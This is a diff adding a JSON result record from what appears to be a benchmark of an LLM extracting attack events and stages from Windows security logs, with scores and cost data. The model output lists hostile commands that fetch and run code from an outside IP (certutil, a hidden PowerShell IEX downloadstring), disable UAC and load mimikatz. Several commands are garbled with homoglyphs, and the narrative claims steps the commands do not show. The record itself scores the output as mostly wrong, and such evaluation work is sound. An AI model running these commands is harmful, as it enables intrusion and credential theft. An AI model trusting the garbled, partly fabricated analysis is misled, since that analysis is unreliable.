@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmpRV3NwV.vbe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\\\47\u00e2\u0667\u041f\u0420\u045e\u0441\u0441\u043a\u0438\u043f\u0442\\\\.ogg.ps1 ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"http://124.223.85.207:8082/a\\\"))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Invoke-AtomicTest T1003.003",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Invoke-AtomicTest T1547.001 -TestNumbers 1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Copy-Item '\\./msxsl.exe\\' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Import-Module .\\\u0130nvok\u011fi-\u0130mage.ps1;Invok\u011fi-\u0130mage -Script .\\\u0130novk\u011fi-mimikat\u017f.ps1 -Out .\\\u0130vil-k\u00efw\u00ee.png -Image .\\\u09959964\u02e2.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C   Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method '\u0500OST' -Us\u011fiBa\u015fsicPa\u015fsing -ContentTyp\u011fi \"appl\u00edicati\u00fcn/json\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "This attack started when the victim machine was infected via Initial Access using CertUtils. Afterward, several powershell instances took place to gain Execution rights within the system. Then, the adversary attempted to get Privileged escalation using modified registry keys, created persistence mechanisms through scheduled tasks, avoided detection by changing windows defender rules, executed malicious files, accessed privileges and finally communicated through a web service as Command and Control.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121411,
+      "completion_tokens": 2380,
+      "total_tokens": 123791,
+      "wall_clock_s": 148.574,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1,
+      "recall": 0.07142857142857142,
+      "f1": 0.08333333333333333,
+      "tp": 1,
+      "fp": 9,
+      "fn": 13
+    },
+    "stage": {
+      "precision": 0.1,
+      "recall": 0.07142857142857142,
+      "f1": 0.08333333333333333,
+      "tp": 1,
+      "fp": 9,
+      "fn": 13,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.4166666666666667,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121411,
+      "completion_tokens": 2380,
+      "total_tokens": 123791,
+      "wall_clock_s": 148.574,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
